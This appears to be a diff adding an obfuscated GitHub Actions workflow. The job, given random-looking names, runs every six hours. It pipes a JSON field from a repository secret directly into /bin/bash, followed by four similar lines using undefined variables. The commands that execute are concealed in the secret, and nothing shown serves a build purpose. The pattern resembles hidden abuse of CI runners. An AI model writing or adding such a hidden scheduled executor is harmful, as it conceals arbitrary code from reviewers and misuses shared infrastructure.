@@ -1,0 +1,22 @@
+name: haojixing6789
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '25 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: haojixing6789
+        env:
+          uzsr21837: ${{ secrets.uzsr21837 }}
+        run: |
+          echo $uzsr21837 | jq -r .ip85 | /bin/bash
+          echo $rb47 | jq -r .xk4 | /bin/bash
+          echo $cfoye530 | jq -r .ibhh6113 | /bin/bash
+          echo $uz07751 | jq -r .dows60 | /bin/bash
+          echo $hkh32 | jq -r .f81 | /bin/bash
+
